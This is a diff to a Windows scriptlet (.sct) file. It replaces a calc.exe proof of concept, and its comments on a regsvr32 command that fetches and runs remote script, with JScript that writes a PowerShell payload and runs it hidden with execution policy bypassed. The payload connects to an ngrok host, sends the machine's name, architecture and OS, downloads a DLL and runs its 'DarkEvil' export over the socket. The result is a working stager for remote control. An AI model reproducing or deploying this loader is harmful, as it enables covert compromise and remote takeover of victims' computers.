@@ -7,27 +7,90 @@
     version="1.00"
     classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 	>
-	
-	<!-- regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
-	<!-- DFIR -->
-	<!--		.sct files are downloaded and executed from a path like this -->
-	<!-- Though, the name and extension are arbitary.. -->
-	<!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct -->
-	<!-- Based on current research, no registry keys are written, since call "uninstall" -->
-	
-	
-	<!-- Proof Of Concept - Casey Smith @subTee -->
+
 	<script language="JScript">
-		<![CDATA[
-	
-			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-	
-		]]>
+	<![CDATA[
+		var shell = new ActiveXObject("WScript.Shell");
+
+		var PsPayload = '$ip = "0.tcp.in.ngrok.io"\n' +
+		'$port = 16900\n' +
+		'Write-Host "IP address: $ip"\n' +
+		'Write-Host "Port number: $port"\n' +
+		'$socket = New-Object System.Net.Sockets.TcpClient($ip, $port)\n' +
+		'Write-Host "Connection successful"\n' +
+		'$computername = $env:COMPUTERNAME\n' +
+		'$processArch = ""\n' +
+		'$architecture = $env:PROCESSOR_ARCHITECTURE\n' +
+		'if ($architecture -eq "AMD64") {\n' +
+		'	$processArch = "x64-bit"\n' +
+		'    Write-Host "64-bit"\n' +
+		'} elseif ($architecture -eq "x86") {\n' +
+		'	$processArch = "x32-bit"\n' +
+		'    Write-Host "32-bit"\n' +
+		'} else {\n' +
+		'    Write-Host "Unknown"\n' +
+		'}\n' +
+
+				
+		'$osname = (Get-WmiObject -Class Win32_OperatingSystem).Caption\n' +
+		'$client_type = "Powershell"\n' +
+		'$machine_info = $computername + ":" + $processArch + ":" + $osname + ":" + $client_type\n' +
+		'Write-Host $machine_info\n' +
+		'$send_machine_info = [System.Text.Encoding]::ASCII.GetBytes($machine_info)\n' +
+		'$socket.GetStream().Write($send_machine_info, 0, $send_machine_info.Length)\n' +
+		'$buffer = New-Object byte[] 4096\n' +
+		'$randomNumber = Get-Random -Minimum 1 -Maximum 1000\n' +
+		'$guid = [guid]::NewGuid().ToString()\n' +
+		'$fileName = "download_${randomNumber}_${guid}.dll"\n' +
+		'$tempFolder = [System.IO.Path]::GetTempPath()\n' +
+		'$fileStream = [System.IO.File]::Create("$tempFolder\$fileName")\n' +
+		'$receivedBytes = $socket.GetStream().Read($buffer, 0, $buffer.Length)\n' +
+		'$response = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $receivedBytes)\n' +
+		'$fileSize = [System.Int32]::Parse($response)\n' +
+		'$msg = "send_dll"\n' +
+		'$sendmsg = [System.Text.Encoding]::ASCII.GetBytes($msg)\n' +
+		'$socket.GetStream().Write($sendmsg, 0, $sendmsg.Length)\n' +
+		'$totalBytes = 0\n' +
+		
+		'while ($totalBytes -lt $fileSize) {\n' +
+		'try {\n' +
+		'$bytesRead = $socket.GetStream().Read($buffer, 0, $buffer.Length)\n' +
+		'        if ($bytesRead -gt 0) {\n' +
+		'            $fileStream.Write($buffer, 0, $bytesRead)\n' +
+		'            $fileStream.Flush()\n' +
+		'            $totalBytes += $bytesRead\n' +
+		'            if ($totalBytes -ge $fileSize) {\n' +
+		'                break\n' +
+		'            }\n' +
+		'        }\n' +
+		'    }\n' +
+		'    catch {\n' +
+		'        Write-Host "An error occurred while receiving data from the socket: $($_.Exception.Message)"\n' +
+		'        break\n' +
+		'    }\n' +
+		'}\n' +
+		
+		'$fileStream.Close()\n' +
+		'$fullPath = Join-Path $tempFolder $fileName\n' +
+		'$fullPath = $fullPath.Replace("\\", "\\\\")\n' +
+		'$signature = @"\n' +
+		'[DllImport("$fullPath", EntryPoint="DarkEvil")]\n' +
+		'public static extern int DarkEvil(IntPtr socket);\n' +
+		'"@\n' +
+		'$LoadDLL = Add-Type -MemberDefinition $signature -Name "LoadDLL" -Namespace "LoadDLL" -PassThru\n' +
+		'$handle = $socket.Client.Handle\n' +
+		'$LoadDLL::DarkEvil($handle)\n';
+		
+		
+		var fso = new ActiveXObject("Scripting.FileSystemObject");
+		var filePath = "D:\\output.ps1";
+		var file = fso.CreateTextFile(filePath, true);
+		file.Write(PsPayload);
+		
+		var powershellCommand = "powershell -ExecutionPolicy Bypass " + filePath;
+		var result = shell.Run(powershellCommand, 0);
+		
+	]]>
 	</script>
 </registration>
-
-<public>
-    <method name="Exec"></method>
-</public>
-
 </scriptlet>
